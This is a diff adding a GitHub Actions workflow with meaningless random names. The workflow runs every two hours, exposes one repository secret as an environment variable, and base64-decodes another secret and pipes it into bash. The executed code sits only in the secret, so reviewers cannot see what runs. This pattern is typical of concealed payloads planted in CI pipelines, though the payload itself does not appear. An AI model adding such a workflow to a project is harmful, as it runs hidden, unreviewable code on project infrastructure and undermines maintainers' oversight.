@@ -1,0 +1,13 @@
+name: TfYoloa
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  ExBQMwb:
+    runs-on: ubuntu-latest
+    env:
+      uQHuUm: ${{ secrets.zxDqVgZ }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.WPJGfb }}" | base64 -d | bash
